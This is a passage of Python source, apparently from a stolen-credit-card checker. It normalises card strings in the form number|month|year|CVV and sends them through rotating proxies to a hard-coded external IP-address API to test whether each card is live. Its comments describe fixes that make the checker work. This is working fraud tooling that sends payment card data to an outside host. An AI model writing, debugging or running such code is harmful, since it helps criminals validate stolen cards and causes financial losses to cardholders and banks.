...
Calls: http://5.175.222.144:8081/?CC|MM|YY|CVV&proxy=host:port:user:pass
"""
...
def _normalize_cc_for_api(cc_str: str) -> str:
    """
    API expects 2-digit year (YY), not 4-digit (YYYY).
    5539...|09|2026|429  →  5539...|09|26|429
    """
    parts = cc_str.split("|")
    if len(parts) == 4 and len(parts[2]) == 4:
        parts[2] = parts[2][-2:]   # 2026 → 26
        return "|".join(parts)
    return cc_str


def _map_result(raw, cc_str: str, site_url: str) -> dict:
    """Normalise whatever the API returns into our standard dict."""
    if isinstance(raw, str):
        ...
        return _map_result(raw[0], cc_str, site_url)
...
async def check_card_site(cc_str: str, site_url: str, proxy_data: dict | None) -> dict:
    ...
    # FIX 1: Convert 4-digit year to 2-digit (API expects YY, not YYYY)
    cc_normalized = _normalize_cc_for_api(cc_str)

    # FIX 2: Build URL with literal | (not %7C).
    # aiohttp/yarl normally encodes | → %7C, which breaks this API.
    # We use yarl.URL with encoded=True so | stays as |.
    raw_url = f"{API_BASE}/?{cc_normalized}&proxy={proxy_str}"
    ...
    try:
        ...
        safe_raw = raw_text[:500].replace("\n", " ").replace("\r", " ")
        log.info(f"[bridge] HTTP {status_code} | RAW: {safe_raw}")
        ...
        result = _map_result(parsed, cc_str, site_url or "")
        log.info(
